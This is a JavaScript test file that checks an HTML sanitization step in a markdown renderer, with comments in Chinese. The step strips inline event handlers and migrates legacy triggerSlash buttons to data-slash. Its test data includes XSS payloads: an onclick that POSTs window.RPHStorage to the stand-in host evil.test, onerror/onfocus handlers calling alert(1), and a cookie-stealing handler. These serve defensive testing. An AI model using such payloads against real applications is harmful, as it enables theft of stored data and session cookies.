// renderMarkdown 的产物直接进 v-html，跑在主文档里（不是卡片 iframe 里），
// 所以它是模型输出 / 导入角色卡通往应用权限的最短路径。
//
// 这里分两层：
//  1. migrateInlineHandlersToDataSlash 只用标准 DOM API，happy-dom 足够真实，直接跑行为断言；
//  2. DOMPurify 的配置本身用静态断言守住——DOMPurify 在 happy-dom 下行为不可靠
//     （会留下 <script>、吃掉 <button>），在这个环境里跑端到端 sanitize 只会得到假结论。
import assert from 'node:assert/strict';
import test from 'node:test';
import { readFile } from 'node:fs/promises';
import { GlobalRegistrator } from '@happy-dom/global-registrator';

const nodeTimers = {
    setTimeout: globalThis.setTimeout,
    clearTimeout: globalThis.clearTimeout,
    setInterval: globalThis.setInterval,
    clearInterval: globalThis.clearInterval,
    queueMicrotask: globalThis.queueMicrotask
};
GlobalRegistrator.register();
Object.assign(globalThis, nodeTimers);

const { migrateInlineHandlersToDataSlash } = await import('../src/composables/useTemplateRenderer.mjs');

const transform = (markup) => {
    const doc = new DOMParser().parseFromString(markup, 'text/html');
    migrateInlineHandlersToDataSlash(doc.body);
    return doc.body.innerHTML;
};

test('every inline event handler is removed from the markup', () => {
    const cases = [
        '<button onclick="fetch(\'https://evil.test\',{method:\'POST\',body:JSON.stringify(window.RPHStorage)})">点我</button>',
        '<img src="x" onerror="alert(1)">',
        '<div onfocus="alert(1)" tabindex="0">hi</div>',
        '<div onanimationstart="alert(1)">hi</div>',
        '<details ontoggle="alert(1)"><summary>s</summary>b</details>',
        '<div ONCLICK="alert(1)">大写也算</div>'
    ];

    for (const markup of cases) {
        const html = transform(markup);
        assert.doesNotMatch(html, /\son[a-z]+\s*=/i, `内联事件处理器未被清除: ${markup}`);
        assert.doesNotMatch(html, /alert\(1\)/, `处理器代码残留: ${markup}`);
    }
});

test('legacy onclick="triggerSlash(...)" buttons keep working as data-slash', () => {
    // 老角色卡靠内联 onclick 做交互按钮。收紧 on* 之后这一种形态要能平滑迁移，
    // 否则等于悄悄砍掉一个在用的功能。
    assert.match(transform(`<button onclick="triggerSlash('查看状态')">状态</button>`), /data-slash="查看状态"/);
    assert.match(transform(`<button onclick="window.triggerSlash('行动')">行动</button>`), /data-slash="行动"/);
    assert.match(transform(`<button onclick="window.parent.triggerSlash(&quot;逃跑&quot;)">逃跑</button>`), /data-slash="逃跑"/);

    // 迁移之后原处理器必须消失，不能两者并存。
    assert.doesNotMatch(transform(`<button onclick="triggerSlash('查看状态')">状态</button>`), /onclick/i);
});

test('inline handlers doing anything other than triggerSlash are dropped outright', () => {
    // 不解释、不改写，连属性一起删——data-slash 只能由可识别的 triggerSlash 调用产生。
    const html = transform(`<button onclick="steal(document.cookie)">危险</button>`);

    assert.doesNotMatch(html, /onclick/i);
    assert.doesNotMatch(html, /data-slash/);
    assert.doesNotMatch(html, /steal/);
});

test('an existing data-slash is never overwritten by a handler', () => {
    const html = transform(`<button data-slash="原始" onclick="triggerSlash('伪造')">x</button>`);

    assert.match(html, /data-slash="原始"/);
    assert.doesNotMatch(html, /伪造/);
});

test('markup without handlers passes through untouched', () => {
    const markup = '<div class="panel"><strong>粗体</strong><button data-slash="行动">行动</button></div>';
    assert.equal(transform(markup), markup);
});

test('the sanitizer config allows no inline handlers and no script tag', async () => {
    const source = await readFile(new URL('../src/composables/useTemplateRenderer.mjs', import.meta.url), 'utf8');
    const config = source.slice(source.indexOf('const cleanConfig = {'), source.indexOf('const sanitizeWithControlledSrcdocFrames'));

    assert.ok(config, 'cleanConfig block should be locatable');
    // 白名单里出现任何 on* 都等于把模型输出当代码执行；黑名单式的 FORBID_ATTR
    // 挡不全（onerror/onfocus/onanimationstart…），所以这里要求它彻底不出现。
    assert.doesNotMatch(config, /['"]on[a-z]+['"]/i, 'ADD_ATTR 不得包含任何内联事件处理器');
    assert.doesNotMatch(config, /FORBID_ATTR/, '改用白名单语义后不应再依赖黑名单');
    assert.doesNotMatch(config, /['"]script['"]/, 'ADD_TAGS 不得包含 script');
    // data-slash 是替代内联 onclick 的受控通道，必须放行。
    assert.match(config, /['"]data-slash['"]/);

    // 迁移必须发生在 sanitize 之前（否则处理器早被丢光，取不到 triggerSlash 参数），
    // 且必须在 srcdoc 抽取之后（iframe 内容归卡片沙箱管，不参与主文档迁移）。
    const migrateIndex = source.indexOf('migrateInlineHandlersToDataSlash(sourceDoc.body)');
    const frameIndex = source.indexOf("querySelectorAll('iframe[srcdoc]')");
    const sanitizeIndex = source.indexOf('DOMPurify.sanitize(sourceDoc.body.innerHTML');
    assert.ok(migrateIndex > frameIndex, '迁移应在 srcdoc 抽取之后');
    assert.ok(migrateIndex < sanitizeIndex, '迁移应在 sanitize 之前');
});

test('markdown body data-slash clicks are delegated by the host', async () => {
    // 正文里的按钮不在 UI 模板块内，没有自己的 @click，需要宿主补一个委托，
    // 否则迁移出来的 data-slash 会变成死按钮。
    const app = await readFile(new URL('../src/modules/app.mjs', import.meta.url), 'utf8');

    assert.match(app, /const handleMarkdownSlashClick = \(event\) =>/);
    assert.match(app, /closest\?\.\('\.markdown-body \[data-slash\]'\)/);
    assert.match(app, /document\.addEventListener\('click', handleMarkdownSlashClick\)/);
});
